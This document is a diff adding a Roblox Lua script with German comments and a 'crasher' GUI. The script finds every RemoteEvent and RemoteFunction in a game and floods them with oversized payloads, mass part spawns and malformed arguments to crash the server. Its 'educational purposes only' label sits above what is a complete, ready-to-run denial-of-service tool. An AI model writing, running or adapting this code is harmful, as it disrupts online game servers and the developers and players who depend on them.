@@ -1,0 +1,257 @@
+-- ============================================
+-- KOMBO-CRASH-SCRIPT mit GUI (nur zu Bildungszwecken)
+-- ============================================
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+
+-- GUI erstellen
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "CrashGUI"
+ScreenGui.Parent = PlayerGui
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 150)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BackgroundTransparency = 0.2
+Frame.BorderSizePixel = 2
+Frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
+Frame.Parent = ScreenGui
+
+-- Titel
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 30)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "💀 KOMBO CRASHER 💀"
+Title.TextColor3 = Color3.fromRGB(255, 0, 0)
+Title.TextScaled = true
+Title.Font = Enum.Font.GothamBold
+Title.Parent = Frame
+
+-- Status Label
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(1, 0, 0, 25)
+StatusLabel.Position = UDim2.new(0, 0, 0, 35)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = "Status: STOPPED"
+StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+StatusLabel.TextScaled = true
+StatusLabel.Font = Enum.Font.Gotham
+StatusLabel.Parent = Frame
+
+-- Start Button
+local StartButton = Instance.new("TextButton")
+StartButton.Size = UDim2.new(0, 120, 0, 35)
+StartButton.Position = UDim2.new(0, 15, 0, 70)
+StartButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+StartButton.Text = "▶ START"
+StartButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+StartButton.TextScaled = true
+StartButton.Font = Enum.Font.GothamBold
+StartButton.Parent = Frame
+
+-- Stopp Button
+local StopButton = Instance.new("TextButton")
+StopButton.Size = UDim2.new(0, 120, 0, 35)
+StopButton.Position = UDim2.new(0, 165, 0, 70)
+StopButton.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+StopButton.Text = "⏹ STOP"
+StopButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+StopButton.TextScaled = true
+StopButton.Font = Enum.Font.GothamBold
+StopButton.Parent = Frame
+
+-- Info Label
+local InfoLabel = Instance.new("TextLabel")
+InfoLabel.Size = UDim2.new(1, 0, 0, 30)
+InfoLabel.Position = UDim2.new(0, 0, 0, 115)
+InfoLabel.BackgroundTransparency = 1
+InfoLabel.Text = "Events: 0 | Parts: 0"
+InfoLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+InfoLabel.TextScaled = true
+InfoLabel.Font = Enum.Font.Gotham
+InfoLabel.Parent = Frame
+
+-- VARIABLEN
+local isRunning = false
+local crashCoroutine = nil
+local allEvents = {}
+local totalParts = 0
+local eventCount = 0
+
+-- ============================================
+-- CRASH FUNKTIONEN
+-- ============================================
+
+-- 1. ALLE RemoteEvents finden
+local function findAllRemoteEvents()
+    local events = {}
+    local allObjects = game:GetDescendants()
+    for i = 1, #allObjects do
+        local obj = allObjects[i]
+        if obj.ClassName == "RemoteEvent" or obj.ClassName == "RemoteFunction" then
+            table.insert(events, obj)
+        end
+    end
+    return events
+end
+
+-- 2. Große Datenpakete erzeugen
+local function createBigPayload()
+    local payload = {
+        string.rep("X", 500000),
+        string.rep("UTF-8-Text-™®©", 10000),
+        {
+            [string.rep("a", 1000)] = string.rep("b", 1000),
+            [string.rep("c", 1000)] = string.rep("d", 1000)
+        }
+    }
+    return payload
+end
+
+-- 3. Massenhaft Parts erstellen
+local function createManyParts()
+    local parts = {}
+    for i = 1, 150 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(10, 10, 10)
+        part.Position = Vector3.new(
+            math.random(-100, 100),
+            math.random(-100, 100),
+            math.random(-100, 100)
+        )
+        table.insert(parts, part)
+        totalParts = totalParts + 1
+    end
+    return parts
+end
+
+-- CRASH LOOP
+local function crashLoop()
+    local bigString = string.rep("Z", 1000000)
+    local bigPayload = createBigPayload()
+    
+    print("[*] Crash gestartet!")
+    print("[*] Gefundene Events: " .. #allEvents)
+    
+    while isRunning do
+        for _, remote in ipairs(allEvents) do
+            if not isRunning then break end
+            
+            -- METHODE 1: Große Daten
+            pcall(function()
+                remote:FireServer(bigPayload, bigString, createManyParts())
+            end)
+
+            -- METHODE 2: Massen-Spawns
+            pcall(function()
+                for i = 1, 50 do
+                    if not isRunning then break end
+                    remote:FireServer(createManyParts())
+                end
+            end)
+
+            -- METHODE 3: Falsche Datentypen
+            pcall(function()
+                remote:FireServer(nil, {}, function() end, 0/0)
+            end)
+        end
+        
+        -- GUI Update
+        eventCount = #allEvents
+        InfoLabel.Text = "Events: " .. eventCount .. " | Parts: " .. totalParts
+        
+        task.wait(0.01)
+    end
+    
+    print("[*] Crash gestoppt!")
+    StatusLabel.Text = "Status: STOPPED"
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+end
+
+-- ============================================
+-- GUI FUNKTIONEN
+-- ============================================
+
+-- START
+StartButton.MouseButton1Click:Connect(function()
+    if isRunning then return end
+    
+    -- Events neu scannen
+    allEvents = findAllRemoteEvents()
+    totalParts = 0
+    eventCount = #allEvents
+    
+    if #allEvents == 0 then
+        StatusLabel.Text = "⚠ KEINE EVENTS GEFUNDEN!"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+        return
+    end
+    
+    isRunning = true
+    StatusLabel.Text = "🔥 CRASHING... 🔥"
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+    StartButton.BackgroundColor3 = Color3.fromRGB(200, 100, 0)
+    
+    crashCoroutine = coroutine.create(crashLoop)
+    coroutine.resume(crashCoroutine)
+end)
+
+-- STOP
+StopButton.MouseButton1Click:Connect(function()
+    if not isRunning then return end
+    
+    isRunning = false
+    StartButton.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+    StatusLabel.Text = "⏹ STOPPING..."
+    StatusLabel.TextColor3 = Color3.fromRGB(255, 165, 0)
+    
+    -- GUI updaten nach kurzer Zeit
+    task.wait(0.5)
+    if not isRunning then
+        StatusLabel.Text = "Status: STOPPED"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        InfoLabel.Text = "Events: " .. #allEvents .. " | Parts: " .. totalParts
+    end
+end)
+
+-- GUI verschiebbar machen
+local dragging = false
+local dragInput
+local dragStart
+local startPos
+
+Frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = Frame.Position
+        
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+Frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
+        local delta = input.Position - dragStart
+        Frame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+-- INITIAL SCAN
+allEvents = findAllRemoteEvents()
+InfoLabel.Text = "Events: " .. #allEvents .. " | Parts: 0"
+print("[*] GUI geladen! Gefundene Events: " .. #allEvents)
+print("[*] Drücke START um den Crash zu beginnen")
